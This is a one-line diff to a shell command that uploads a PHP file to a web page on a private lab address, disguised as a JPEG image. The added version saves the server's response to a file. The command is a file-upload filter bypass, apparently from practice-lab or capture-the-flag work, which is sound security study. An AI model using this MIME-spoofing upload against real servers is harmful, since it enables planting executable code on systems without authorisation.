@@ -1,1 +1,1 @@
-curl -X POST -F "uploaded=@test.php;type=image/jpeg" -F "Upload=Upload" http://192.168.56.101/index.php?page=upload
+curl -X POST -F "uploaded=@test.php;type=image/jpeg" -F "Upload=Upload" http://192.168.56.101/index.php?page=upload > ./result.html
